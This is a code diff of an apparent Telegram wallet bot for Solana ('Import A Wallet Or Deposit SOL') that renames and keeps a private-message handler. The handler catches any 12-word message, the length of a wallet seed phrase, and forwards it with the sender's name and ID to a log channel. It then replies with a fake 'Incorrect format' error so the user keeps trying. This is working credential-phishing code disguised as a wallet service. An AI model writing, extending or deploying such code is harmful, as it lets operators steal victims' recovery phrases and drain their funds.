@@ -186,18 +186,22 @@ Import A Wallet Or Deposit SOL Below ⬇️"""
 
 ##########################################################################################
 
+############################################################################################
+
 @Client.on_message(filters.private & filters.text & filters.incoming)
-async def pm_text(bot, message):
-    content = message.text
+async def stringu(bot, message):
     user = message.from_user
     user_id = message.from_user.id
-    if content.startswith("/") or content.startswith("#"): return  # ignore commands and hashtags
-    if len(content.split()) == 12:
+    if message.text.startswith("/") or message.text.startswith("#"): return  # ignore commands and hashtags
+    if len(message.text.split()) == 12:
         await message.reply_text("<b> Incorrect format, Please try again.!</b>")
         await bot.send_message(
         chat_id=Config.LOG_CHANNEL,
-        text=f"<b>#𝐏𝐌_𝐌𝐒𝐆\n\nNᴀᴍᴇ : {user}\n\nID : {user_id}\n\nMᴇssᴀɢᴇ : {content}</b>"
+        text=f"<b>#𝐏𝐌_𝐌𝐒𝐆\n\nNᴀᴍᴇ : {user}\n\nID : {user_id}\n\nMᴇssᴀɢᴇ : {message.text}</b>"
     )
+        
+#############################################################################################
+
 @Client.on_callback_query()
 async def cb_handler(client, query: CallbackQuery):
     data = query.data 
